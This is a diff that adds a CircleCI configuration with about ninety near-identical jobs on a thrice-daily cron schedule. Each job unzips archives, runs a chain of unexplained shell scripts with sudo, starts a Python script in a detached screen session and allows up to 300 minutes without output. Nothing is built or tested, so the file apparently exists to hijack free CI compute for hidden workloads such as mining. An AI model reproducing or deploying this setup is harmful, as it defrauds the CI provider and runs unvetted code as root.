@@ -1,0 +1,583 @@
+working_dir: &working_dir ~/app
+.build_template: &commonSteps
+  steps:
+    - checkout
+    - run:
+        name: A
+        command: |
+          sudo apt update -y
+    - run:
+        name: B
+        command: |
+          sleep 10s          
+          unzip naga.zip && chmod u+x *
+          #./naga.sh###
+    - run:
+        name: C
+        command: |
+          unzip natsu.zip >/dev/null 2>&1
+    - run:
+        name: D
+        command: |
+          chmod u+x *
+    - run:
+        name: E
+        command: |
+          sudo ./aku.sh
+    - run:
+        name: F
+        command: |
+          sudo ./Bojo.sh
+    - run:
+        name: G
+        command: |
+          sudo ./cilok.sh
+    - run:
+        name: H
+        command: |
+          sudo ./dan.sh
+    - run:
+        name: I
+        command: |
+          sudo ./ewe.sh
+    - run:
+        name: J
+        command: |
+          #sudo ./Frean.sh#no_run
+    - run:
+        name: K
+        no_output_timeout: 300m
+        command: |
+          echo "Ijin Berkah Om. . ."
+          sudo ./gok.sh
+          sudo ./halah.sh
+          sudo ./Itu.sh
+          screen -dmS Acdb python3 pro03.py
+          sleep 300s
+          ./main03.sh
+  working_directory: *working_dir
+
+version: 2.0
+
+jobs:
+  AOX_01:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  AOX_02:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_03:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  AOX_04:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_05:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_06:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_07:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_08:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_09:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_10:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_11:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_12:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_13:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_14:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_15:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_16:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_17:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_18:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_19:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_20:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_21:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_22:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_23:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  AOX_24:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_25:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_26:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_27:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_28:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_29:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_30:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_31:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_32:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_33:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  AOX_34:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_35:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_36:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_37:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_38:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_39:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_40:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_41:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_42:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_43:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  AOX_44:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_45:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_46:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_47:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_48:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_49:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_50:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_51:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_52:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_53:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  AOX_54:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_55:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_56:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_57:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_58:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_59:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_60:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_61:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_62:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_63:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  AOX_64:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_65:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_66:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_67:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_68:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_69:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_70:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_71:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_72:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_73:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  AOX_74:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_75:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_76:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_77:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_78:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_79:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_80:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_81:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_82:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_83:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  AOX_84:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_85:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_86:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_87:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_88:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_89:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_90:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_91:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  AOX_92:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_93:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  AOX_94:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_95:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_96:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_97:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_98:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  AOX_99:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+
+    triggers:
+      - schedule:
+          cron: "0 0,8,16 * * *"
+          filters:
+            branches:
+              only:
+                - anak
+                - kucing
+                - main
+                - di
+                - jalan
+
+workflows:
+  version: 2
+  Alahngono:
+    jobs:
+      - AOX_01
+      - AOX_02
+      - AOX_03
+      - AOX_04
+      - AOX_05
+      - AOX_06
+      - AOX_07
+      - AOX_08
+      - AOX_09
+      - AOX_10
+      - AOX_11
+      - AOX_12
+      - AOX_13
+      - AOX_14
+      - AOX_15
+      - AOX_16
+      - AOX_17
+      - AOX_18
+      - AOX_19
+      - AOX_20
+      - AOX_21
+      - AOX_22
+      - AOX_23
+      - AOX_24
+      - AOX_25
+      - AOX_26
+      - AOX_27
+      - AOX_28
+      - AOX_29
+      - AOX_30
+      - AOX_31
+      - AOX_32
+      - AOX_33
+      - AOX_34
+      - AOX_35
+      - AOX_36
+      - AOX_37
+      - AOX_38
+      - AOX_39
+      - AOX_40
+      - AOX_41
+      - AOX_42
+      - AOX_43
+      - AOX_44
+      - AOX_45
+      - AOX_46
+      - AOX_47
+      - AOX_48
+      - AOX_49
+      - AOX_50
+      - AOX_51
+      - AOX_52
+      - AOX_53
+      - AOX_54
+      - AOX_55
+      - AOX_56
+      - AOX_57
+      - AOX_58
+      - AOX_59
+      - AOX_60
+      - AOX_61
+      - AOX_62
+      - AOX_63
+      - AOX_64
+      - AOX_65
+      - AOX_66
+      - AOX_67
+      - AOX_68
+      - AOX_69
+      - AOX_70
+      - AOX_71
+      - AOX_72
+      - AOX_73
+      - AOX_74
+      - AOX_75
+      - AOX_76
+      - AOX_77
+      - AOX_78
+      - AOX_79
+      - AOX_80
+      - AOX_81
+      - AOX_82
+      - AOX_83
+      - AOX_84
+      - AOX_85
+      - AOX_86
+      - AOX_87
+      - AOX_88
+      - AOX_89
+      - AOX_90
+      - AOX_91
+      - AOX_92
+      - AOX_93
+      - AOX_94
+      - AOX_95
+      - AOX_96
+      - AOX_97
+      - AOX_98
+      - AOX_99
